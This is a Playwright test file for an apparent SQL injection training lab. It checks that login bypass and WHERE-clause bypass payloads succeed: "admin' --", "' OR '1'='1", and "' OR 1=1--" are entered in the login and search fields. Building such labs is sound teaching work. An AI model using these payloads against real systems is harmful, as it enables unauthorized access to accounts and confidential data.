import { test, expect } from '@playwright/test'

test.describe('Level 1-1: Login Bypass', () => {
  test('payload 1 - comment out password check', async ({ page }) => {
    await page.goto('/login')
    await page.fill('#username', "admin' --")
    await page.fill('#password', 'anything')
    await page.click('[type="submit"]')
    await expect(page).not.toHaveURL(/\/login/)
  })

  test('payload 2 - force true condition on password', async ({ page }) => {
    await page.goto('/login')
    await page.fill('#username', 'admin')
    await page.fill('#password', "' OR '1'='1")
    await page.click('[type="submit"]')
    await expect(page).not.toHaveURL(/\/login/)
  })
})

test.describe('Level 1-2: WHERE Clause Bypass', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('/login')
    await page.fill('#username', "admin' --")
    await page.fill('#password', 'anything')
    await page.click('[type="submit"]')
    await page.waitForURL(/\/dashboard/)
  })

  test('payload - comment out confidential filter', async ({ page }) => {
    await page.goto('/dashboard')
    await page.fill('.search-bar input', "' OR 1=1--")
    await page.click('.search-btn')
    await expect(page.locator('.badge-confidencial').first()).toBeVisible()
  })
})
